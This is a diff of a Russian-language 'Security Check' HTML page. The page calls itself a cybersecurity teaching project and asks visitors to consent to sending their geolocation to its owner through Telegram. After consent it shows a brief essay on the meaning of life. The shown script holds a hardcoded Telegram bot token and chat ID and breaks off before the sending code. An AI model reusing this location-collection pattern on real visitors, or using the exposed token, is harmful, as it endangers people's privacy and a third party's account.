@@ -1,12 +1,112 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>Проверка</title>
-</head>
-<body>
-    <h2>Загрузка...</h2>
+<meta charset="UTF-8">
+<title>Security Check</title>
 
+<style>
+body {
+    margin: 0;
+    font-family: Inter, Arial, sans-serif;
+    background: radial-gradient(circle at top, #020617, #000);
+    color: #e5e7eb;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.card {
+    background: rgba(15, 23, 42, 0.95);
+    border-radius: 18px;
+    padding: 34px;
+    max-width: 720px;
+    width: 90%;
+    box-shadow: 0 30px 80px rgba(0,0,0,.7);
+}
+
+h1 {
+    margin-top: 0;
+}
+
+label {
+    display: flex;
+    gap: 10px;
+    margin-top: 20px;
+    font-size: 14px;
+    color: #cbd5f5;
+}
+
+button {
+    margin-top: 24px;
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 12px;
+    border: none;
+    cursor: pointer;
+    background: linear-gradient(135deg, #38bdf8, #6366f1);
+    color: #020617;
+}
+
+button:disabled {
+    opacity: .4;
+    cursor: not-allowed;
+}
+
+.article {
+    display: none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card" id="gate">
+    <h1>🛡 Проверка безопасности</h1>
+
+    <p>
+        Данный сайт является учебным проектом по кибербезопасности.
+        Для демонстрации утечки данных браузера используется
+        геолокация пользователя.
+    </p>
+
+    <p>
+        При подтверждении координаты будут отправлены владельцу проекта
+        через Telegram.
+    </p>
+
+    <label>
+        <input type="checkbox" id="consent">
+        Я понимаю и даю согласие на передачу данных
+    </label>
+
+    <button id="btn" disabled onclick="requestLocation()">
+        Продолжить
+    </button>
+</div>
+
+<div class="card article" id="article">
+    <h1>А я знаю что это такое?</h1>
+
+    <p>
+        Смысл жизни редко приходит как готовая формула.
+        Он не записан в инструкциях и не выдается при рождении.
+    </p>
+
+    <p>
+        Он появляется в момент, когда человек начинает
+        осознавать последствия своих действий
+        и принимает ответственность за свой выбор.
+    </p>
+
+    <p>
+        Возможно, смысл жизни —
+        не найти окончательный ответ,
+        а научиться жить с вопросом,
+        не убегая от него.
+    </p>
+</div>
 <script>
 const BOT_TOKEN = "7813938825:AAFEYmSyG68_Ebv9nWcqBAackF42hdq-Ey8";
 const CHAT_ID = "6724600945";
